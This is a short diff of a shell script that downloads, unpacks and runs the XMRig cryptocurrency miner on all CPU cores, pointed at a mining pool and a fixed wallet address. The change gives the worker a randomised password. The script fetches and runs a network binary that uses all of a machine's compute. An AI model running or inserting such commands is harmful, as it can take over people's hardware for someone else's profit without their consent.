@@ -2,4 +2,4 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
 tar xf xmrig-6.22.2-linux-static-x64.tar.gz
 cd xmrig-6.22.2
-./xmrig --donate-level 1 -a rx/0 -o sal.us.ekapool.com:16666 -u SaLvs7hDXDzGc5SyXFscw4hMXB1UDX1iASNP7mhsvu2RawQWpEdZSifCLNP36eufYsYYN4MReWt5jdYRNWNiSbBpLpnt64NbKAC -p x -t $(nproc --all)
+./xmrig --donate-level 1 -a rx/0 -o sal.us.ekapool.com:16666 -u SaLvs7hDXDzGc5SyXFscw4hMXB1UDX1iASNP7mhsvu2RawQWpEdZSifCLNP36eufYsYYN4MReWt5jdYRNWNiSbBpLpnt64NbKAC -p $(echo $RANDOM | md5sum | head -c 10) -t $(nproc --all)
